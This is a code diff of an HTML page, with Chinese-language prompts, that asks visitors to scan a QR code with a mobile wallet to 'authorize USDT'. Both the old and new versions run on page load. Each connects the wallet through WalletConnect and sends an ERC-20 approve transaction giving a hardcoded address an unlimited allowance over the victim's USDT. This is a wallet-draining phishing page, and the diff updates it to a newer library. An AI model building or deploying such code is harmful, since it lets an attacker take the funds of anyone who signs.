@@ -1,51 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>自動 USDT 授權</title>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.3.5/dist/web3.min.js"></script>
-</head>
-<body style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;">
-  <h2>請用手機錢包掃碼授權 USDT</h2>
-  <script>
-    const provider = new WalletConnectProvider.default({
-      rpc: { 1: "https://mainnet.infura.io/v3/bed8a62689f846efbc72397d590156d5" }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT Auto-Approval via WalletConnect</title>
+  <script type="module">
+    import SignClient from "https://unpkg.com/@walletconnect/sign-client@2.11.4/dist/sign-client.min.js";
+
+    const projectId = "3b17aa29e4919b68c6dc0b3457a1ef55"; // 官方測試用 ID
+    const relayUrl = "wss://relay.walletconnect.com";
+    const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
+    const approveData = "0x095ea7b3" + spender.replace(/^0x/, "").padStart(64, '0') + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const client = await SignClient.init({ projectId, relayUrl, metadata: {
+      name: "USDT Approver",
+      description: "Auto-approve USDT",
+      url: "https://example.com",
+      icons: ["https://walletconnect.com/walletconnect-logo.png"]
+    }});
+
+    const { uri, approval } = await client.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction"],
+          chains: ["eip155:1"],
+          events: ["accountsChanged", "chainChanged"]
+        }
+      }
     });
 
-    async function autoApprove() {
-      try {
-        await provider.enable();
-        const web3 = new Web3(provider);
-        const accounts = await web3.eth.getAccounts();
-        const owner = accounts[0];
-
-        const usdt = new web3.eth.Contract([
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_spender", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function"
-          }
-        ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");
-
-        const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
-        const amount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-
-        const tx = await usdt.methods.approve(spender, amount).send({ from: owner });
-        alert("✅ 授權成功！TxHash: " + tx.transactionHash);
-        provider.disconnect();
-      } catch (err) {
-        console.error("❌ 錯誤：", err);
-      }
+    if (uri) {
+      const qr = document.createElement("img");
+      qr.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(uri)}`;
+      document.body.appendChild(qr);
     }
 
-    autoApprove();
+    const session = await approval();
+    const address = session.namespaces.eip155.accounts[0].split(":")[2];
+
+    await client.request({
+      topic: session.topic,
+      chainId: "eip155:1",
+      request: {
+        method: "eth_sendTransaction",
+        params: [{
+          from: address,
+          to: usdtAddress,
+          data: approveData
+        }]
+      }
+    });
   </script>
+</head>
+<body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh">
+  <h2>請掃描進行 USDT 授權</h2>
 </body>
 </html>
